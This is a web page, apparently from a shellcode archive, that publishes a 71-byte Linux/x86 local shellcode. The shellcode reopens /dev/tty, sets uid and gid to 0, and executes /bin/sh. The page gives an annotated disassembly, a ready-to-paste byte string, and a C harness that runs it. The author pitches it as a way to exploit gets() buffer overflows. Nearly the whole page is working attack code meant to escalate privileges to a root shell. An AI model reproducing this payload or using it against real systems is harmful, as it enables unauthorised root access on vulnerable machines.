<html><head><title>Linux/x86 - setuid + setgid + stdin re-open + execve - 71 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * setuid + setgid + stdin re-open shellcode for linux/x86 (71 bytes)
 *
 * Author: Andres C. Rodriguez (acamro) &lt;acamro gmail com&gt;
 *
 * Based on:
 * Marco Ivaldi's concept (stdin re-open shellcode for Linux/x86)
 *
 * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin
 * descriptor and re-opens /dev/tty, then sets setuid and setgid
 * (elevation) and finally it does an execve() of /bin/sh.
 * Useful to exploit some gets() buffer overflows in an elegant way...
 *
 */

/* 83 c4 18                add    $0x18,%esp
 *
 * close(0)
 *
 * 31 c0                   xor    %eax,%eax
 * 31 db                   xor    %ebx,%ebx
 * b0 06                   mov    $0x6,%al
 * cd 80                   int    $0x80
 *
 * open("/dev/tty", O_RDWR | ...)
 *
 * 53                      push   %ebx
 * 68 2f 74 74 79          push   $0x7974742f
 * 68 2f 64 65 76          push   $0x7665642f
 * 89 e3                   mov    %esp,%ebx
 * 31 c9                   xor    %ecx,%ecx
 * 66 b9 12 27             mov    $0x2712,%cx
 * b0 05                   mov    $0x5,%al
 * cd 80                   int    $0x80
 *
 * setuid(0)
 *
 * 6a 17                   push   $0x17
 * 58                      pop    %eax
 * 31 db                   xor    %ebx, %ebx
 * cd 80                   int    $0x80
 *
 * setgid(0)
 *
 * 6a 2e                   push   $0x2e
 * 58                      pop    %eax
 * 53                      push   %ebx
 * cd 80                   int    $0x80
 *
 * execve("/bin/sh", ["/bin/sh"], NULL)
 *
 * 31 c0                   xor    %eax,%eax
 * 50                      push   %eax
 * 68 2f 2f 73 68          push   $0x68732f2f
 * 68 2f 62 69 6e          push   $0x6e69622f
 * 89 e3                   mov    %esp,%ebx
 * 50                      push   %eax
 * 53                      push   %ebx
 * 89 e1                   mov    %esp,%ecx
 * 99                      cltd
 * b0 0b                   mov    $0xb,%al
 * cd 80                   int    $0x80
 */

// full copy-paste:
// "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
// (71 bytes)

char sc[] =
"\x83\xc4\x18"
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x2e\x58\x53\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

main()
{
	int (*f)() = (int (*)())sc; f();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>

